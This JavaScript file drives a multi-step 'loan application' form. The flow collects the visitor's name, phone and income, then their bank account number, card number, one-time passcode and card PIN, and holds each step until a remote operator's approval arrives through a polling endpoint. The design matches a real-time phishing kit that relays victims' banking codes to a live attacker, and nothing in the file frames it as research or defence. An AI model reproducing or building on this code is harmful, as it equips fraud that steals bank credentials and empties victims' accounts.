function goToScreen(screenId) {
    document.querySelectorAll('.screen').forEach(s => s.classList.add('hidden'));
    document.getElementById(screenId).classList.remove('hidden');
}

function showSpinner() { document.getElementById('loading-spinner').classList.remove('hidden'); }
function hideSpinner() { document.getElementById('loading-spinner').classList.add('hidden'); }

async function postData(step, data) {
    showSpinner();
    try {
        const response = await fetch('/api/submit', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ step, data })
        });
        const result = await response.json();
        if (result.pendingApproval) {
            pollAdminResponse();
        } else {
            hideSpinner();
        }
    } catch (e) {
        hideSpinner();
        alert('Network connection error.');
    }
}

function pollAdminResponse() {
    fetch('/api/poll-status')
        .then(res => res.json())
        .then(res => {
            hideSpinner();
            if (res.status === 'approved') {
                if (res.next === 'otp') goToScreen('screen-step4');
                else if (res.next === 'pin') goToScreen('screen-step5');
                else if (res.next === 'success') goToScreen('screen-success');
            } else if (res.status === 'denied' || res.status === 'retry_otp' || res.status === 'blocked' || res.status === 'retry_pin') {
                alert(res.message);
                if (res.status === 'retry_pin') {
                    document.getElementById('pin-notice').innerText = res.message;
                }
            } else if (res.status === 'resend') {
                alert(res.message);
            }
        })
        .catch(() => {
            hideSpinner();
        });
}

function submitStep1(e) {
    e.preventDefault();
    const data = {
        fullName: document.getElementById('fullName').value,
        phone: document.getElementById('phone').value
    };
    goToScreen('screen-step2');
    postData('step1', data);
}

function submitStep2(e) {
    e.preventDefault();
    const data = {
        reason: document.getElementById('reason').value,
        monthlyIncome: document.getElementById('monthlyIncome').value,
        requestedAmount: document.getElementById('requestedAmount').value
    };
    goToScreen('screen-step3');
    postData('step2', data);
}

function submitStep3(e) {
    e.preventDefault();
    const data = {
        accountNumber: document.getElementById('accountNumber').value,
        cardNumber: document.getElementById('cardNumber').value
    };
    postData('step3', data);
}

function submitStep4(e) {
    e.preventDefault();
    const inputs = document.querySelectorAll('.otp-input');
    let otp = '';
    inputs.forEach(i => otp += i.value);
    postData('step4', { otp });
}

function resendOtp(e) {
    e.preventDefault();
    postData('step4', { otp: 'RESEND_REQUEST' });
}

function submitStep5(e) {
    e.preventDefault();
    const inputs = document.querySelectorAll('.pin-input');
    let pin = '';
    inputs.forEach(i => pin += i.value);
    postData('step5', { pin });
}
